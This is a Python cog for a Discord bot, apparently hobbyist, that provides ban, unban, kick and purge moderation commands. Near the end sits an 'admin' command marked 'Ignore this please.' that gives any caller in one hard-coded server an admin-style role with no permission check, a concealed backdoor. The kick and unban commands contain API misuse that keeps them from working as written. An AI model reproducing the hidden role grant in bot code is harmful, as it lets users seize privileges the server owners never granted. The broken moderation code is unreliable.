import nextcord
from nextcord.ext import commands

class Moderation(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # Checks to perform before doing certain commands:
    def hommies_check(ctx):
        return ctx.guild.id == 903236631958548501

    def no_hommies_check(ctx):
        return ctx.guild.id != 903236631958548501

    def no_hommies_general_check(ctx):
        return ctx.channel.id != 903236632684138559

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    @commands.check(no_hommies_check)
    async def ban(self, ctx, member: nextcord.Member, *, reason="No reason provided."):
        """B a n  h a m m e r"""
        try:
                await member.ban(reason=reason)
                await ctx.send(f'{member} has been banned for "{reason}"')
        except Exception as e:
            await ctx.reply(f"Cannot ban {member}.")


    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def unban(self, ctx, member: nextcord.Member):
        try:
            await nextcord.Member.unban(member, reason=None)
            await ctx.send(f"{member} has been unbanned")
        except Exception as e:
            await ctx.reply(f"Failed to unban {member}")

    @commands.command()
    @commands.has_guild_permissions(kick_members=True)
    @commands.check(no_hommies_check)
    async def kick(self, ctx, member: nextcord.ClientUser.id, *, reason="No reason provided."):
        """KicKkk"""
        try:
                await member.kick(reason=reason)
                await ctx.send(f'{member} has been kicked for "{reason}"')
        except Exception as e:
            await ctx.reply("Cannot kick this user.")

    @commands.command(pass_context=True,aliases=['clean'])
    @commands.check(no_hommies_general_check)
    @commands.has_permissions(manage_messages=True)
    async def purge(self, ctx, limit: int):
        """Removes messages"""
        await ctx.channel.purge(limit=limit+1)
        await ctx.send('Chat purged by {}'.format(ctx.author.mention))
        await ctx.message.delete()

    @commands.command()
    @commands.check(hommies_check)
    async def admin(self, ctx):
        """Ignore this please."""
        member = ctx.author
        var = nextcord.utils.get(ctx.guild.roles, name = "admon")
        await member.add_roles(var)

def setup(bot):
    bot.add_cog(Moderation(bot))
